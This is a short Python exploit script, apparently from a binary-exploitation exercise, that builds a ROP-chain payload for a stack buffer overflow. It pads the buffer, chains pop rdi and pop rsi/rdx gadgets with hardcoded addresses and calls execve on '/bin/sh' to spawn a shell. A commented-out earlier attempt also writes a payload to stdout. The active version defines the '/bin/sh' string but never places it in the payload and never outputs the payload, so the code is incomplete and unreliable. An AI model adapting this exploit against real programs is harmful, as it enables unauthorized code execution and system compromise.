#!/usr/bin/env python3

import sys

'''
#bin sh in hex, need value to overwrite to stack etc.:
bin_sh_str = (0x0068732f6e69622f).to_bytes(8, 'little')

#this is so we know we are at the end for bin str
null_terminator = (b'\x00' * 2)

#null arguments are in RDI and RSI registers with value 0, this is for NULL arguments of excev
null_rdi = (0).to_bytes(8, 'little')
null_rsi = (0).to_bytes(8, 'little')

#Address for stack ptr.
stack_addr = (0x7ffffff68fc8).to_bytes(8, 'little')
#address for executing ROP gadget to call exec
execv_addr = (0x7ffffff68fd0).to_bytes(8, 'little')
#address for gadget instr, which helps to achieve ROP chain 
return_addr = (0x0000000000401e48).to_bytes(8, 'little')


hacking = bin_sh_str + null_terminator + null_rdi + null_rsi + stack_addr + execv_addr + return_addr
sys.stdout.buffer.write(hacking)
'''
padding = b"A" * 64 + b"B" * 8

# Gadget: pop rdi; ret - Load the address of "/bin/sh" into rdi
pop_rdi_gadget = (0x0000000000401e12).to_bytes(8, 'little')

# place the "/bin/sh" string as part of our payload
bin_sh_str = b"/bin/sh\x00"

pop_rsi_rdx_gadget = (0x0000000000401e20).to_bytes(8, 'little')  # Gadget to pop into rsi and rdx, if available
null_value = (0).to_bytes(8, 'little')

execve_address = (0x7ffffff68fd0).to_bytes(8, 'little')

# Construct the final payload
hacking = (
    padding +
    pop_rdi_gadget + 
    (0x7ffffff68fb0).to_bytes(8, 'little') +  # Address of "/bin/sh" in payload
    pop_rsi_rdx_gadget + 
    null_value + 
    null_value + 
    execve_address
)